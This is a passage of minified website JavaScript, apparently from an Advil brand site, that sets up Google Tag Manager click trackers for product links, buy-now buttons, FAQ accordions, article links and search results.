links",eventAction:"suggested",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:'.layout-homepage [class*="reference-advil-"] a, .layout-homepage [class*="reference-advil-"] a *',eventTargetClosestSelector:'[class*="reference-advil-"]',eventTargetChildSelector:"h3"}).init(),bpComponents.bpTrackers.buyNowButtonClickTracker=new GTMTracker({id:"buyNowButtonClickTracker",eventCategory:"where to buy",eventAction:"buy now",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:'.layout-product-details .first a[href*="donde-comprar"] *, .layout-product-details .first a[href*="donde-comprar"]',eventTargetClosestSelector:".first",eventTargetChildSelector:".richText-content h1"}).init(),bpComponents.bpTrackers.faqQuestionOpenTracker=new GTMTracker({id:"faqQuestionOpenTracker",eventCategory:"faq",eventAction:"open",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".accordion-slide:not(.is-active) *",eventTargetClosestSelector:".accordion-slide",eventTargetChildSelector:".accordion-title-text"}).init(),bpComponents.bpTrackers.faqQuestionCloseTracker=new GTMTracker({id:"faqQuestionCloseTracker",eventCategory:"faq",eventAction:"close",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".accordion-slide.is-active *",eventTargetClosestSelector:".accordion-slide",eventTargetChildSelector:".accordion-title-text"}).init(),bpComponents.bpTrackers.productDetailTabsTracker=new GTMTracker({id:"productDetailTabsTracker",eventCategory:"product links",eventAction:"detail tab",eventTrigger:"click",eventLabel:"{{text}}",eventTargetSelector:".tabs-nav-item *",eventTargetClosestSelector:".text-wrapper"}).init(),bpComponents.bpTrackers.productSelectedTracker=new GTMTracker({id:"productSelectedTracker",eventCategory:"product links",eventAction:"list selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".layout-product-listing .products-list-wrapper .snippetReference.component .richText.component>.component-content>.richText-content a[href]",eventTargetClosestSelector:".richText-content",eventTargetChildSelector:"h3"}).init(),bpComponents.bpTrackers.articleSelectedTracker=new GTMTracker({id:"articleSelectedTracker",eventCategory:"article links",eventAction:"list selection",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".layout-product-listing .snippetReference.component .richText.component>.component-content>.richText-content a[href]:not(.layout-product-listing .snippetReference.component.megamenu-navigation .richText.component>.component-content>.richText-content a[href]):not(.layout-product-listing .products-list-wrapper .snippetReference.component .richText.component>.component-content>.richText-content a[href])",eventTargetClosestSelector:".richText-content",eventTargetChildSelector:"h3"}).init(),bpComponents.bpTrackers.articleReadmoreTracker=new GTMTracker({id:"articleReadmoreTracker",eventCategory:"article links",eventAction:"read more",eventTrigger:"click",eventLabel:"{{childText}}",eventTargetSelector:".layout-product-listing .snippetReference.component .richText.component>.component-content>.richText-content a[href]:not(.layout-product-listing .snippetReference.component.megamenu-navigation .richText.component>.component-content>.richText-content a[href]):not(.layout-product-listing .products-list-wrapper .snippetReference.component .richText.component>.component-content>.richText-content a[href]),.snippetReference.component .flex-article-list .component-content>.richText-content a[href]",eventTargetClosestSelector:".richText-content",eventTargetChildSelector:"h3"}).init(),e(document).ready(e=>{!function e(){"function"==typeof ga?ga(function(e){if(Boolean(document.querySelector("body.layout-search-results"))){let e=document.querySelector(".searchResults-number"),t=0;Boolean(e)&&(t=(e.childNodes[0].textContent||"").trim().split(" ")[0]);let r={event:"customEvent",eventCategory:"site search",eventAction:(document.querySelector(".searchResults-term").textContent||"").trim(),eventLabel:"results:"+t};dataLayer.push(r)}}):setTimeout(e,500)}()}),bpComponents.bpTrackers.numberOfSearchResultsTracker=new GTMTracker({id:"numberOfSearchResultsTracker",eventCategory:"site search",eventAction:"{{sharerText}}",eventTrigger:"click",eventLabel:"selected:{{link}}",eventTargetSelector:".searchResults-title a",eventTargetClosestSelector:"a",eventTargetParentSelector:".searchResults",eventTargetSharerSelector:".searchResults-term"}).init()})})(Cog.jQuery());

